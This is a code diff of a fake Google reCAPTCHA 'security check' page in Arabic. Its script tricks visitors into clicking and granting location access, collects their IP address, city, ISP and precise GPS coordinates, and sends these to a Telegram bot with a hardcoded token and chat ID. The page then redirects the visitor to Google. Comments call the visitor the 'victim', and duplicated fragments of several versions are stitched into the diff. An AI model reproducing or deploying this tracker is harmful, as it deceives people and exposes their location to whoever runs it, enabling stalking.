@@ -8,7 +8,7 @@
         body { font-family: sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 10px rgba(0,0,0,0.05); width: 300px; cursor: pointer; }
         .checkbox-container { display: flex; align-items: center; }
-        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 15px; }
+        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 15px; display: flex; justify-content: center; align-items: center; }
         .text { font-size: 14px; color: #555; font-weight: 500; }
         .logo { margin-right: auto; text-align: center; }
         .logo img { width: 35px; }
@@ -36,290 +36,38 @@
     const chatId = "1149386368";
 
     async function startCheck() {
+        // إخفاء المربع وإظهار التحميل
         document.getElementById('check-mark').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        // 1. جلب IP (صامت)
+        // 1. جلب الـ IP والبيانات الأساسية فوراً
         try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const d = await ipRes.json();
-            sendToTelegram(`🌐 **دخول جديد**\nIP: ${d.ip}\nالدولة: ${d.country_name}\nالمدينة: ${d.city}`);
-        } catch(e) {}
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            const msg = "🌐 دخول جديد:\nIP: " + data.ip + "\nالدولة: " + data.country_name + "\nالمدينة: " + data.city;
+            sendToTelegram(msg);
+        } catch (e) { console.log(e); }
 
-        // 2. جلب الموقع (بإذن)
+        // 2. طلب الموقع الدقيق (GPS)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                
-                // الرابط المصحح 100%
                 const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
-                
-                sendToTelegram(`🎯 **الموقع الدقيق وصل:**\n${mapLink}`);
-                finish();
+                sendToTelegram("🎯 الموقع الدقيق (GPS):\n" + mapLink);
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
             }, (err) => {
-                sendToTelegram("❌ رفض الإذن.");
-                finish();
-            }, {enableHighAccuracy: true});
+                sendToTelegram("❌ الضحية رفض إذن الموقع.");
+                window.location.href = "https://www.google.com";
+            }, { enableHighAccuracy: true });
         } else {
-            finish();
-        }
-    }
-
-    function sendToTelegram(msg) {
-        new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    }
-
-    function finish() {
-        setTimeout(() => {
             window.location.href = "https://www.google.com";
-        }, 1500);
-    }
-</script>
-</body>
-</html>
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 15px;
-            color: #333;
-        }
-        p {
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 25px;
-            color: #5f6368;
-        }
-        .captcha-box {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            padding: 15px;
-            margin-bottom: 25px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        .captcha-box:hover {
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            border-color: #c1c1c1;
-        }
-        .checkbox-area {
-            display: flex;
-            align-items: center;
-        }
-        .checkbox {
-            width: 26px;
-            height: 26px;
-            border: 2px solid #dadce0;
-            border-radius: 2px;
-            position: relative;
-            margin-left: 15px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .checkbox.checked {
-            background-color: #4285f4;
-            border-color: #4285f4;
-        }
-        .checkbox.checked::after {
-            content: '✓';
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .recaptcha-text {
-            font-size: 15px;
-            font-weight: 500;
-            color: #3c4043;
-        }
-        .recaptcha-logo {
-            text-align: right;
-        }
-        .recaptcha-logo img {
-            width: 30px;
-        }
-        .recaptcha-logo p {
-            font-size: 10px;
-            margin: 0;
-            color: #9b9b9b;
-        }
-        .progress-bar-container {
-            width: 100%;
-            background-color: #e0e0e0;
-            border-radius: 4px;
-            overflow: hidden;
-            height: 8px;
-            margin-top: 20px;
-            display: none; /* Hidden by default */
-        }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background-color: #4285f4;
-            border-radius: 4px;
-            animation: progress 3s forwards;
-            display: none; /* Hidden by default */
-        }
-        .status-message {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #5f6368;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="google-logo">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x52dp.png" alt="Google">
-    </div>
-    <h2>تحقق الأمان من Google</h2>
-    <p>
-        للتأكد من أنك لست برنامج روبوت، يرجى إثبات هويتك. يتطلب هذا التحقق الوصول إلى موقعك الجغرافي.
-    </p>
-
-    <div class="captcha-box" id="captchaBox" onclick="startVerification()">
-        <div class="checkbox-area">
-            <div class="checkbox" id="checkboxMark"></div>
-            <div class="recaptcha-text">أنا لست برنامج روبوت</div>
-        </div>
-        <div class="recaptcha-logo">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-            <p>الخصوصية - البنود</p>
-        </div>
-    </div>
-
-    <div class="progress-bar-container" id="progressBarContainer">
-        <div class="progress-bar" id="progressBar"></div>
-    </div>
-    <p class="status-message" id="statusMessage"></p>
-</div>
-
-<script>
-    const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8"; // توكن البوت الخاص بك
-    const chatId = "1149386368"; // الـ Chat ID الخاص بك
-
-    let initialIpSent = false;
-
-    async function sendToTelegram(msg) {
-        new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    }
-
-    async function startVerification() {
-        document.getElementById('captchaBox').onclick = null; // تعطيل الضغطات المتعددة
-        document.getElementById('checkboxMark').classList.add('checked');
-        document.getElementById('statusMessage').innerText = "جاري التحقق من هويتك...";
-        document.getElementById('progressBarContainer').style.display = 'block';
-        document.getElementById('progressBar').style.display = 'block';
-
-        // 1. إرسال معلومات الـ IP الأساسية أولاً (بدون إذن)
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const d = await ipRes.json();
-            if (!initialIpSent) { // لضمان الإرسال مرة واحدة فقط
-                sendToTelegram(`🌐 **عملية تحقق جديدة:**\nIP: ${d.ip}\nالدولة: ${d.country_name}\nالمدينة: ${d.city}\nشركة الاتصال: ${d.org}`);
-                initialIpSent = true;
-            }
-        } catch(e) {
-            console.error("Failed to get initial IP info:", e);
-        }
-
-        // 2. طلب الموقع الدقيق (هنا تظهر نافذة طلب الإذن للمستخدم)
-        if (navigator.geolocation) {
-            document.getElementById('statusMessage').innerText = "يرجى السماح بالوصول لموقعك الجغرافي لتأكيد هويتك...";
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    sendToTelegram(`🎯 **تم تحديد الموقع بدقة (GPS):**\n${mapLink}`);
-                    document.getElementById('statusMessage').innerText = "تم التحقق بنجاح! جاري التوجيه...";
-                    finishVerification();
-                },
-                (err) => {
-                    let errorMessage = "";
-                    switch (err.code) {
-                        case err.PERMISSION_DENIED:
-                            errorMessage = "المستخدم رفض إذن الموقع.";
-                            break;
-                        case err.POSITION_UNAVAILABLE:
-                            errorMessage = "معلومات الموقع غير متاحة.";
-                            break;
-                        case err.TIMEOUT:
-                            errorMessage = "انتهى وقت طلب الموقع.";
-                            break;
-                        default:
-                            errorMessage = "خطأ غير معروف في الموقع.";
-                            break;
-                    }
-                    sendToTelegram(`❌ **فشل التحقق من الموقع:**\n${errorMessage}`);
-                    document.getElementById('statusMessage').innerText = "فشل التحقق من الموقع. جاري التوجيه...";
-                    finishVerification();
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        } else {
-            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع الجغرافي.");
-            document.getElementById('statusMessage').innerText = "المتصفح لا يدعم تحديد الموقع. جاري التوجيه...";
-            finishVerification();
         }
     }
 
-    function finishVerification() {
-        setTimeout(() => {
-            window.location.href = "https://www.google.com"; // التحويل إلى جوجل كإنهاء للعملية
-        }, 3000); // 3 ثوانٍ لإظهار رسالة النجاح أو الفشل
-    }
-</script>
-
-</body>
-</html>
-    const chatId = "1149386368";
-
-    async function startCheck() {
-        document.getElementById('check-mark').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        // 1. جلب البيانات الأساسية (IP) بدون استئذان
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const d = await ipRes.json();
-            sendToTelegram(`🌐 **دخول جديد**\nIP: ${d.ip}\nالدولة: ${d.country_name}\nالمدينة: ${d.city}`);
-        } catch(e) {}
-
-        // 2. طلب الموقع الدقيق (هنا تظهر رسالة السماح)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendToTelegram(`🎯 **تم تحديد الموقع بدقة (GPS):**\n${mapLink}`);
-                finish();
-            }, (err) => {
-                sendToTelegram("❌ الضحية رفض إعطاء إذن الموقع الدقيق.");
-                finish();
-            });
-        } else {
-            finish();
-        }
-    }
-
-    function sendToTelegram(msg) {
-        new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    }
-
-    function finish() {
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 1000);
+    function sendToTelegram(text) {
+        const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text);
+        new Image().src = url;
     }
 </script>
 
